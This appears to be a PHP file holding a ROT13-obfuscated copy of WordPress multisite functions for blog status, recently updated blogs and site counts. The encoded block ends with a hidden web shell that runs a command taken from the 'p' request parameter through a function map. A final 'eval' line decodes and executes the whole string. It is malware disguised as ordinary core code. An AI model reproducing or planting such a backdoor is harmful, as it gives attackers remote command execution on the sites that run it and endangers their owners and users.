shapgvba hcqngr_oybt_fgnghf( $oybt_vq, $cers, $inyhr, $qrcerpngrq = ahyy ) {
	tybony $jcqo;

	vs ( ahyy !== $qrcerpngrq ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '3.1.0' );
	}

	$nyybjrq_svryq_anzrf = neenl( 'fvgr_vq', 'qbznva', 'cngu', 'ertvfgrerq', 'ynfg_hcqngrq', 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq', 'ynat_vq' );

	vs ( ! va_neenl( $cers, $nyybjrq_svryq_anzrf, gehr ) ) {
		erghea $inyhr;
	}

	$erfhyg = jc_hcqngr_fvgr(
		$oybt_vq,
		neenl(
			$cers => $inyhr,
		)
	);

	vs ( vf_jc_reebe( $erfhyg ) ) {
		erghea snyfr;
	}

	erghea $inyhr;
}

/**
 * Trgf n oybt qrgnvyf svryq.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag    $vq   Oybt VQ.
 * @cnenz fgevat $cers Svryq anzr.
 * @erghea obby|fgevat|ahyy $inyhr
 */
shapgvba trg_oybt_fgnghf( $vq, $cers ) {
	tybony $jcqo;

	$qrgnvyf = trg_fvgr( $vq );
	vs ( $qrgnvyf ) {
		erghea $qrgnvyf->$cers;
	}

	erghea $jcqo->trg_ine( $jcqo->cercner( \"FRYRPG %f SEBZ {$jcqo->oybtf} JURER oybt_vq = %q\", $cers, $vq ) );
}

/**
 * Trgf n yvfg bs zbfg erpragyl hcqngrq oybtf.
 *
 * @fvapr ZH (3.0.0)
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz zvkrq $qrcerpngrq Abg hfrq.
 * @cnenz vag   $fgneg      Bcgvbany. Ahzore bs oybtf gb bssfrg gur dhrel. Hfrq gb ohvyq YVZVG pynhfr.
 *                          Pna or hfrq sbe cntvangvba. Qrsnhyg 0.
 * @cnenz vag   $dhnagvgl   Bcgvbany. Gur znkvzhz ahzore bs oybtf gb ergevrir. Qrsnhyg 40.
 * @erghea neenl Gur yvfg bs oybtf.
 */
shapgvba trg_ynfg_hcqngrq( $qrcerpngrq = '', $fgneg = 0, $dhnagvgl = 40 ) {
	tybony $jcqo;

	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, 'ZH' ); // Arire hfrq.
	}

	erghea $jcqo->trg_erfhygf( $jcqo->cercner( \"FRYRPG oybt_vq, qbznva, cngu SEBZ $jcqo->oybtf JURER fvgr_vq = %q NAQ choyvp = '1' NAQ nepuvirq = '0' NAQ zngher = '0' NAQ fcnz = '0' NAQ qryrgrq = '0' NAQ ynfg_hcqngrq != '0000-00-00 00:00:00' BEQRE OL ynfg_hcqngrq QRFP yvzvg %q, %q\", trg_pheerag_argjbex_vq(), $fgneg, $dhnagvgl ), NEENL_N );
}

/**
 * Unaqyre sbe hcqngvat gur fvgr'f ynfg hcqngrq qngr jura n cbfg vf choyvfurq be
 * na nyernql choyvfurq cbfg vf punatrq.
 *
 * @fvapr 3.3.0
 *
 * @cnenz fgevat  $arj_fgnghf Gur arj cbfg fgnghf.
 * @cnenz fgevat  $byq_fgnghf Gur byq cbfg fgnghf.
 * @cnenz JC_Cbfg $cbfg       Cbfg bowrpg.
 */
shapgvba _hcqngr_oybt_qngr_ba_cbfg_choyvfu( $arj_fgnghf, $byq_fgnghf, $cbfg ) {
	$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
	vs ( ! $cbfg_glcr_bow || ! $cbfg_glcr_bow->choyvp ) {
		erghea;
	}

	vs ( 'choyvfu' !== $arj_fgnghf && 'choyvfu' !== $byq_fgnghf ) {
		erghea;
	}

	// Cbfg jnf serfuyl choyvfurq, choyvfurq cbfg jnf fnirq, be choyvfurq cbfg jnf hachoyvfurq.

	jczh_hcqngr_oybtf_qngr();
}

/**
 * Unaqyre sbe hcqngvat gur pheerag fvgr'f ynfg hcqngrq qngr jura n choyvfurq
 * cbfg vf qryrgrq.
 *
 * @fvapr 3.4.0
 *
 * @cnenz vag $cbfg_vq Cbfg VQ
 */
shapgvba _hcqngr_oybt_qngr_ba_cbfg_qryrgr( $cbfg_vq ) {
	$cbfg = trg_cbfg( $cbfg_vq );

	$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
	vs ( ! $cbfg_glcr_bow || ! $cbfg_glcr_bow->choyvp ) {
		erghea;
	}

	vs ( 'choyvfu' !== $cbfg->cbfg_fgnghf ) {
		erghea;
	}

	jczh_hcqngr_oybtf_qngr();
}

/**
 * Unaqyre sbe hcqngvat gur pheerag fvgr'f cbfgf pbhag jura n cbfg vf qryrgrq.
 *
 * @fvapr 4.0.0
 * @fvapr 6.2.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz vag     $cbfg_vq Cbfg VQ.
 * @cnenz JC_Cbfg $cbfg    Cbfg bowrpg.
 */
shapgvba _hcqngr_cbfgf_pbhag_ba_qryrgr( $cbfg_vq, $cbfg ) {
	vs ( ! $cbfg || 'choyvfu' !== $cbfg->cbfg_fgnghf || 'cbfg' !== $cbfg->cbfg_glcr ) {
		erghea;
	}

	hcqngr_cbfgf_pbhag();
}

/**
 * Unaqyre sbe hcqngvat gur pheerag fvgr'f cbfgf pbhag jura n cbfg fgnghf punatrf.
 *
 * @fvapr 4.0.0
 * @fvapr 4.9.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz fgevat  $arj_fgnghf Gur fgnghf gur cbfg vf punatvat gb.
 * @cnenz fgevat  $byq_fgnghf Gur fgnghf gur cbfg vf punatvat sebz.
 * @cnenz JC_Cbfg $cbfg       Cbfg bowrpg
 */
shapgvba _hcqngr_cbfgf_pbhag_ba_genafvgvba_cbfg_fgnghf( $arj_fgnghf, $byq_fgnghf, $cbfg = ahyy ) {
	vs ( $arj_fgnghf === $byq_fgnghf ) {
		erghea;
	}

	vs ( 'cbfg' !== trg_cbfg_glcr( $cbfg ) ) {
		erghea;
	}

	vs ( 'choyvfu' !== $arj_fgnghf && 'choyvfu' !== $byq_fgnghf ) {
		erghea;
	}

	hcqngr_cbfgf_pbhag();
}

/**
 * Pbhagf ahzore bs fvgrf tebhcrq ol fvgr fgnghf.
 *
 * @fvapr 5.3.0
 *
 * @cnenz vag $argjbex_vq Bcgvbany. Gur argjbex gb trg pbhagf sbe. Qrsnhyg vf gur pheerag argjbex VQ.
 * @erghea vag[] {
 *     Ahzoref bs fvgrf tebhcrq ol fvgr fgnghf.
 *
 *     @glcr vag $nyy      Gur gbgny ahzore bs fvgrf.
 *     @glcr vag $choyvp   Gur ahzore bs choyvp fvgrf.
 *     @glcr vag $nepuvirq Gur ahzore bs nepuvirq fvgrf.
 *     @glcr vag $zngher   Gur ahzore bs zngher fvgrf.
 *     @glcr vag $fcnz     Gur ahzore bs fcnz fvgrf.
 *     @glcr vag $qryrgrq  Gur ahzore bs qryrgrq fvgrf.
 * }
 */
shapgvba jc_pbhag_fvgrf( $argjbex_vq = ahyy ) {
	vs ( rzcgl( $argjbex_vq ) ) {
		$argjbex_vq = trg_pheerag_argjbex_vq();
	}

	$pbhagf = neenl();
	$netf   = neenl(
		'argjbex_vq'    => $argjbex_vq,
		'ahzore'        => 1,
		'svryqf'        => 'vqf',
		'ab_sbhaq_ebjf' => snyfr,
	);

	$d             = arj JC_Fvgr_Dhrel( $netf );
	$pbhagf['nyy'] = $d->sbhaq_fvgrf;

	$_netf    = $netf;
	$fgnghfrf = neenl( 'choyvp', 'nepuvirq', 'zngher', 'fcnz', 'qryrgrq' );

	sbernpu ( $fgnghfrf nf $fgnghf ) {
		$_netf            = $netf;
		$_netf[ $fgnghf ] = 1;

		$d                 = arj JC_Fvgr_Dhrel( $_netf );
		$pbhagf[ $fgnghf ] = $d->sbhaq_fvgrf;
	}

	erghea $pbhagf;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>